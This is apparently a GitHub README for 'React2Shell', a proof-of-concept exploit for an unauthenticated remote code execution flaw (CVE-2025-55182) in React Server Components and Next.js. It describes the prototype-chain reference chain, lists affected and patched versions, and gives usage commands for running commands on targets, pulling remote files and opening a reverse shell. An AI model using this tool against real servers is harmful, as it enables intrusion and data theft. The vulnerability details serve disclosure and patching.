<div align="center">
  <img src="https://img.icons8.com/ios_filled/512/FA5252/react-native.png" width="120" alt="react2shell"><br>
  <h3>React2Shell</h3>
  <p>CVE-2025-55182 (Next.js: CVE-2025-66478)<br>Unauthenticated RCE in React Server Components (Flight Protocol) - PoC Exploit</p>
</div>

### Description
React Server Components (Flight protocol) deserialize attacker-controlled `multipart/form-data` without validating prototype-chain access. A single unauthenticated POST with a `Next-Action` header reaches the `Function` constructor through a crafted reference chain (`$1:__proto__:then` + `$1:constructor:constructor`), resulting in remote code execution on the server.

Affects `react-server-dom-{webpack,turbopack,parcel}` 19.0.0 - 19.2.0 and downstream consumers including **Next.js** App Router (14.3.0-canary.77+, 15.x, 16.x). Default `create-next-app` projects are vulnerable.

### Usage

```
git clone https://github.com/rvzsec/react2shell
cd react2shell
pip3 install -r requirements.txt
```

```
python3 react2shell.py check    -t <target>
python3 react2shell.py exec     -t <target> -c '<command>'
python3 react2shell.py shell    -t <target>
python3 react2shell.py file     -t <target> -f <remote-path> -o <local-out>
python3 react2shell.py revshell -t <target> --lhost <ip> --lport <port>
```

### Patched Versions
React 19.0.1 / 19.1.2 / 19.2.1+ - Next.js 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7

### Credits
Original disclosure: [Lachlan Davidson](https://react2shell.com/) ([@lachlan2k](https://github.com/lachlan2k))
